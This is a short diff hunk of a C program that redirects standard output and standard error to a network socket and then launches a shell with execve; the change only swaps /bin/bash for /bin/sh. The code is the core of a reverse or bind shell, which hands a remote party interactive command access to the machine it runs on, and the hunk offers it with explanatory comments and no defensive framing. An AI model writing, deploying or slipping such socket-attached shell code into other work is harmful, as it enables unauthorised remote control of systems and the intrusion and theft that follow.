@@ -31,8 +31,8 @@ int main() {
     dup2(sockfd, 1); //redirect standard output to the socket
     dup2(sockfd, 2); //redirect standard error to the socket
 
-    char *argv[] = {"/bin/bash", NULL}; //pass command-line arguments, the first argument should be the name of the program itself
-    if (execve("/bin/bash", argv, NULL) == -1) { //execute the shell
+    char *argv[] = {"/bin/sh", NULL}; //pass command-line arguments, the first argument should be the name of the program itself
+    if (execve("/bin/sh", argv, NULL) == -1) { //execute the shell
         perror("execve");
         exit(1);
     }
